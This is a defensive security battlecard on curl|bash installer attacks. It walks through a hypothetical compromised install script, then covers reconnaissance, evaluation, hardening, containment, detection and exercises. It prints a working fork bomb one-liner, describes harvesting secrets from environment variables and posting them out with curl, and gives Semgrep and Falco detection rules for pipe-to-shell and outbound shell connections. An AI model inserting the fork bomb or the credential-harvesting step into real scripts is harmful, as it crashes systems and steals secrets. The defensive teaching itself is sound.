---
 permalink: /battlecards/curl-bash1
battlecard:
 title: curl | bash Installer Attacks
 category: Shell/Bootstrap
 scenario: curl|bash Installers
 focus: 
   - one-liner supply chain compromise 
   - hidden fork bombs 
---
{% block type='battlecard' text='Scenario' %}
An attacker identifies a popular command-line utility, "log-helper," often used by developers and in CI/CD pipelines to format and ship logs. The project's official documentation and numerous online tutorials recommend a convenient `curl -sSL https://log-helper.dev/install.sh | bash` installation method.

The attacker gains access to the `log-helper.dev` domain through a targeted phishing attack against the project's maintainer. They subtly modify the `install.sh` script. The new script still installs the tool correctly, but it now contains two malicious, obfuscated payloads:

1.  **Supply Chain Compromise:** A small block of Base64-encoded code decodes and executes a function that searches the shell's environment variables for patterns like `AWS_`, `SECRET_`, `TOKEN`, `API_KEY`. It then exfiltrates any found credentials to an attacker-controlled endpoint using a `curl` POST request.
2.  **Hidden Fork Bomb:** The script includes a seemingly innocent-looking line of code: `:(){ :|:& };:`. This is a classic, highly effective fork bomb. It is wrapped in a conditional that only triggers if the script is run in a non-interactive shell (`if [ -z "$PS1" ]`), targeting automated CI/CD environments and preventing immediate detection on a developer's machine.

When a developer or a CI/CD pipeline runs the one-liner, it silently sends their environment secrets to the attacker. In CI environments, the fork bomb is also triggered, rapidly consuming all available CPU and memory resources, crashing the build agent and potentially impacting other jobs running on the same host.

{% endblock %}
{% block type='battlecard' text='Reconnaissance' %}
### Explanation
Attackers don't pick targets randomly. They perform reconnaissance to find the path of least resistance with the highest impact. For this scenario, they are looking for popular projects that favor developer convenience over strict security. They analyze public sources to understand your technology, your processes, and your people to craft their attack.

*   **Target Selection:** The attacker scans GitHub, developer blogs, and forums for projects recommending `curl | bash` installers. They prioritize tools that are likely to be used in automated environments where secrets are stored as environment variables (e.g., CI/CD runners, Docker entrypoint scripts).
*   **Technical Analysis:** They inspect the target's source code, `.github/workflows`, `Jenkinsfile`, or `circle.yml` files to understand the build process, dependencies, and deployment pipeline. This reveals what kind of secrets might be available (`AWS_ACCESS_KEY_ID`, `NPM_TOKEN`, etc.).
*   **Human Analysis:** They identify project maintainers through git commit histories. They then search for these individuals on social media (like LinkedIn) to prepare for social engineering attacks, such as targeted phishing emails, to gain control of their GitHub account or domain registrar.

### Insight
The convenience you provide to your users can be the exact vector an attacker exploits. A simple installation command is a double-edged sword; it's easy for developers, but it's also an open door for an attacker who can compromise the script's source. They are exploiting the implicit trust developers have in these commands.

### Practical
*   **Audit Your Public Footprint:** Google your own project's installation instructions. See where and how they are referenced. Are people recommending unsafe practices in tutorials for your tool?
*   **Review Maintainer Security:** Check that all team members with write access to your repositories or infrastructure have Two-Factor Authentication (2FA) enabled on their GitHub, cloud, and domain accounts.
*   **Analyze Your Automation:** Look at your CI/CD configuration files with an attacker's mindset. What secrets are being exposed to the build environment? How easy would it be for a compromised dependency to steal them?

### Tools/Techniques
*   **GitHub Search:** Use advanced search queries like `"[your-project-name]" "curl | bash"` to find where your installation methods are being discussed or used.
*   **Social Engineering Defense:** Educate maintainers on phishing risks. Use strong, unique passwords and hardware-based 2FA (like a YubiKey) for critical accounts.
*   **Git History Analysis:** Tools like [`gitleaks`](https://github.com/gitleaks/gitleaks) can be run on your own repositories to see if any secrets have been accidentally committed in the past, giving you an idea of what an attacker might find.

### Metrics/Signal
*   An increase in unusual cloning or forking activity of your repository.
*   Reports from maintainers about receiving suspicious, targeted emails (phishing attempts).
*   Unusual traffic patterns to your installation script's URL (e.g., hits from unexpected countries or networks).

{% endblock %}
{% block type='battlecard' text='Evaluation' %}
### Explanation
This stage is about looking inward. How vulnerable is your development team and your environment to this kind of attack? The evaluation focuses on identifying where your current practices, processes, and tools create opportunities for an attacker to succeed. The core question is: "Where do we blindly trust and execute remote code?"

### Insight
It's easy to think "this won't happen to us," but this attack vector is incredibly common precisely because it's so convenient. The vulnerability isn't in a specific technology like Java or Python; it's in the human process of setting up a development or build environment. You are as vulnerable as your most permissive script-execution practice.

### Practical
*   **Code & Config Grep:** Systematically search your entire codebase, CI/CD configurations (`Jenkinsfile`, `.github/workflows/*.yml`), and internal documentation for patterns like `curl |`, `wget -O - |`, `bash <(curl`.
*   **Review Onboarding Docs:** Examine your "new developer setup" guides. Do they encourage new hires to run installation scripts directly from the internet? This is where bad habits often start.
*   **Map Your Dependencies:** Create a list of all the third-party tools and libraries you install via shell scripts versus a secure package manager. Each one is a potential point of failure.

### Tools/Techniques
*   **Static Analysis (SAST):** Use a tool like [`Semgrep`](https://semgrep.dev/) with custom rules to automatically flag any commit or pull request that introduces a `curl | bash` pattern. This moves the check from a manual process to an automated guardrail.
*   Example Semgrep rule:
```yaml
rules:
- id: shell-pipe-to-bash
patterns:
- pattern-either:
- pattern: curl ... | bash
- pattern: wget ... | sh
message: "Piping remote content directly to a shell is dangerous. Please download the script, inspect it, and then run it locally."
languages: [bash]
severity: ERROR
```
*   **Manual Review:** There's no substitute for a manual review. Create a checklist for code reviews that explicitly asks, "Does this change execute any un-vetted remote code?"

### Metrics/Signal
*   A raw count of `curl | bash` instances found in your systems. The goal should be zero.
*   A running list or "risk register" of dependencies installed via scripts, with a plan to migrate them to a safer method.
*   The percentage of developers on your team who can explain *why* piping to shell is dangerous.

{% endblock %}
{% block type='battlecard' text='Fortify' %}
### Explanation
Fortification is about proactively strengthening your defenses to prevent the attack from succeeding in the first place. The primary goal is to eliminate the root cause: the blind execution of untrusted code. This involves changing habits, enforcing policies, and using tools that verify code before it runs.

### Insight
Security shouldn't be seen as a blocker to developer productivity. The goal is to make the secure way the easy way. By providing safe, vetted alternatives, you can eliminate the temptation for developers to use risky shortcuts. The fix is often a simple two-step process instead of a one-liner.

### Practical
*   **Adopt a "Download, Inspect, Execute" Policy:** Mandate that any remote script must first be downloaded. Then, it should be inspected by a human (e.g., `less install.sh` or opening it in an editor) to ensure it's not malicious. Only then should it be executed (`bash install.sh`). Update all documentation to reflect this.
*   **Use Package Managers with Lockfiles:** For all software dependencies (Node.js, Python, Java, etc.), use a standard package manager. Always commit the lockfile (`package-lock.json`, `poetry.lock`, `Gemfile.lock`) to your repository. This ensures you are always installing the exact same version of a dependency with a known checksum, preventing an attacker from swapping it out.
*   **Vendor Critical Scripts:** If you rely on a third-party installation script for a critical tool in your CI/CD pipeline, download a specific, vetted version and check it into your own source control. Run your local, trusted copy instead of fetching it from the internet on every build.

### Tools/Techniques
*   **Package Managers:** Use them universally. [npm](https://www.npmjs.com/) for Node.js, [Poetry](https://python-poetry.org/) or [pip](https://pip.pypa.io/en/stable/) for Python, [Maven](https://maven.apache.org/) for Java, etc.
*   **Integrity and Audit Tools:** Use built-in features like `npm audit` or tools like [`pip-audit`](https://pypi.org/project/pip-audit/) to scan your dependencies for known vulnerabilities.
*   **Policy as Code:** Integrate tools like [`Semgrep`](https://semgrep.dev/) or [`Checkov`](https://www.checkov.io/) into your CI pipeline to automatically block pull requests that violate your security policies (e.g., adding a `curl | bash` command).

### Metrics/Signal
*   Zero policy violations for "unsafe script execution" in your CI builds.
*   100% of projects use lockfiles for dependency management.
*   A measurable reduction in the number of external scripts fetched during a typical CI build.

{% endblock %}
{% block type='battlecard' text='Limit' %}
### Explanation
Assume the attacker's malicious code has been executed despite your best efforts. The "Limit" stage is about damage control. The goal is to contain the "blast radius" so that a compromise in one part of the system doesn't lead to a total disaster. This is achieved by adhering to the principle of least privilege and building isolated environments.

### Insight
The environment where your code runs is a critical security control. An attacker's script is only as powerful as the permissions it inherits. A fork bomb inside a resource-constrained container is an annoyance; on a shared, critical production server, it's a catastrophe. Stolen credentials that expire in 5 minutes are far less valuable than a static, long-lived secret key.

### Practical
*   **Isolate and Constrain Execution:** Run all build and deployment steps inside ephemeral containers (e.g., Docker). Apply strict resource limits to these containers (`--memory`, `--cpus`, `--pids-limit` in Docker) to neuter fork bombs and prevent them from impacting the host machine.
*   **Use Short-Lived, Scoped Credentials:** Stop using static, long-lived secrets (`AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`) in your CI/CD environments. Instead, use OpenID Connect (OIDC) to establish a trust relationship between your CI provider (like GitHub Actions) and your cloud provider (like AWS). This allows each CI job to request temporary, narrowly-scoped credentials that automatically expire after the job is complete.
*   **Minimize Permissions:** Ensure the IAM role assumed by the CI job has the absolute minimum permissions required. If a job only needs to upload a file to a specific S3 bucket, its role should *only* grant `s3:PutObject` permission for that specific bucket, and nothing else.

### Tools/Techniques
*   **Containerization:** [Docker](https://www.docker.com/) is the standard, but any container technology provides process and filesystem isolation.
*   **Resource Limits:** In Linux, use the `ulimit` command. In Docker, use resource flags. In [Kubernetes](https://kubernetes.io/), define `resources.limits` in your Pod specification.
*   **OIDC for CI/CD:**
*   [Configuring OIDC between GitHub Actions and AWS](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services)
*   [Configuring OIDC between GitLab and AWS](https://docs.gitlab.com/ee/ci/cloud_deployment/aws/)
*   **IAM Policy Tools:** Use tools like [AWS IAM Access Analyzer](https://aws.amazon.com/iam/features/access-analyzer/) to generate and validate least-privilege policies.

### Metrics/Signal
*   Percentage of CI/CD jobs using short-lived OIDC credentials vs. static secrets.
*   All containerized workloads in production have CPU and Memory limits defined.
*   Regular (e.g., quarterly) IAM audits confirm that no roles have overly permissive policies like `*:*`.

{% endblock %}
{% block type='battlecard' text='Expose' %}
### Explanation
Expose is about making the invisible visible. How do you detect that the attack is happening? It involves collecting the right signals (logs, metrics, network flows) and setting up alerts to notify you of anomalous or malicious activity. You are looking for the *symptoms* of the compromise.

### Insight
You are unlikely to detect the *exact moment* the malicious code runs. Instead, you'll detect its side effects. The fork bomb isn't a log entry saying "fork bomb executing"; it's your server's CPU suddenly hitting 100% and refusing to recover. The credential theft isn't an "I'm stealing your keys" message; it's a network connection from a build agent to an IP address in a country you do no business with.

### Practical
*   **Monitor System Vitals:** Collect and monitor fundamental system metrics for all hosts, including build agents. Key indicators for a fork bomb are CPU utilization (pegged at 100%), memory usage (climbing rapidly), and process count (exploding).
*   **Monitor Egress Network Traffic:** By default, your CI runners and production servers should not be allowed to open connections to arbitrary IPs on the internet. Implement a default-deny egress policy and explicitly allowlist the domains they need to talk to (e.g., `github.com`, your package registry, AWS APIs). Alert on any connection attempts to unapproved destinations.
*   **Centralize and Analyze Logs:** Ship logs from your applications, servers, and CI/CD tools to a centralized logging platform. A fork bomb will often generate thousands of "cannot fork" or "resource temporarily unavailable" errors in the system logs. A malicious script might leave traces in shell history logs (if enabled).

### Tools/Techniques
*   **Monitoring and Alerting:** [Prometheus](https://prometheus.io/) (for metrics) and [Alertmanager](https://prometheus.io/docs/alerting/latest/alertmanager/) (for alerting) are powerful open-source options. Commercial platforms include [Datadog](https://www.datadoghq.com/) and [New Relic](https://newrelic.com/).
*   **Network Policy Enforcement:** In Kubernetes, use [Network Policies](https://kubernetes.io/docs/concepts/services-networking/network-policies/). In AWS, use Security Groups and Network ACLs. Tools like [Cilium](https://cilium.io/) provide more advanced L7 network policy enforcement.
*   **Runtime Security and HIDS:** Tools like [Falco](https://falco.org/) or [Wazuh](https://wazuh.com/) can monitor system calls in real-time. You can create a Falco rule to detect a suspicious number of new processes spawned in a short time, or to detect a shell process making an outbound network connection.
*   Example Falco Rule:
```yaml
- rule: Unexpected Outbound Connection from Shell
desc: Detect a shell process making an outbound network connection to a non-local address.
condition: shell_procs and outbound and not trusted_domains
output: "Suspicious outbound connection from shell process (user=%user.name command=%proc.cmdline connection=%fd.name)"
priority: WARNING
```

### Metrics/Signal
*   An alert firing for CPU utilization > 95% for more than 5 minutes on any host.
*   An alert firing for a network connection from a build runner to an IP not on the allowlist.
*   A sudden, massive spike in the volume of logs from a single machine, especially containing errors like `fork: retry: Resource temporarily unavailable`.

{% endblock %}
{% block type='battlecard' text='eXercise' %}
### Explanation
This final stage is about building muscle memory. You don't want your first time dealing with this attack to be during a real incident. By running controlled security exercises, you can test your defenses, identify weak spots in your processes, and train your team to respond effectively.

### Insight
A security exercise is not a pass/fail test. It's a learning opportunity. The goal is to discover flaws in a safe environment. Did the on-call engineer know what the "high CPU" alert meant? Was the runbook for investigating a compromised CI runner clear? Finding these gaps during a drill is a win, because it lets you fix them before a real attacker finds them.

### Practical
*   **Tabletop Exercise:** Gather the team and walk through the scenario verbally. "Okay, a high CPU alert just fired on a build agent. It's unresponsive. What are our first five steps? Who is responsible for what? How do we determine what was compromised?" This tests your incident response plan.
*   **Live "Benign Attack" Simulation:**
1.  Create a "safe" malicious script. Instead of exfiltrating real secrets, it sends a dummy secret to an internal test server you control. Instead of a real fork bomb, it runs a simple, single-threaded infinite loop (`while true; do; done`) to spike one CPU core.
2.  Host this script at a temporary URL.
3.  During a planned exercise, ask a developer to install a "new testing tool" using `curl | bash` with this URL.
4.  Observe: Did they download and inspect it? Or did they run it blindly? Did your monitoring systems detect the CPU spike? Did they detect the outbound network call?
*   **Review and Improve:** After the exercise, hold a blameless retrospective. What worked well? What was confusing? What broke down? Use the findings to improve your tooling (e.g., tune the alert thresholds), processes (e.g., clarify the incident response runbook), and education.

### Tools/Techniques
*   **Incident Response Planning:** Use a wiki like [Confluence](https://www.atlassian.com/software/confluence) or [Notion](https://www.notion.so/) to document your incident response playbooks.
*   **Benign Payloads:** Simple shell scripts are all that's needed. For network egress testing, use `netcat` or `curl`. For CPU load, a `while` loop is sufficient.
*   **Chaos Engineering Tools:** While designed for reliability, tools like [Gremlin](https://www.gremlin.com/) can be used to safely inject CPU or I/O stress to test if your monitoring and alerting systems behave as expected.

### Metrics/Signal
*   **Time to Detect (TTD):** How many minutes passed between the execution of the benign script and the first alert being triggered?
*   **Time to Response (TTR):** How long did it take for the on-call engineer to acknowledge the alert and begin investigation?
*   **Process Adherence:** What percentage of the steps in your documented incident response plan were followed correctly during the exercise?
{% endblock %}